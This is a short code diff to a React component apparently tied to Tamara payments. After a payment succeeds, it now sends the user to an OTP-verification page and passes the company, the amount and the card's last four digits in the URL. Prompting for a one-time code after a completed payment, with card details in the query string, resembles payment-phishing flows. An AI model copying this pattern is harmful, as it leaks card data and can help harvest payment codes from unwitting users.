@@ -73,7 +73,7 @@ const TamaraPaymentProcessing = () => {
             clearInterval(pollInterval);
             setPaymentStatus("success");
             setTimeout(() => {
-              navigate("/payment-success");
+              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}`);
             }, 2000);
           } else if (statusData.payment_status === "rejected") {
             clearInterval(pollInterval);
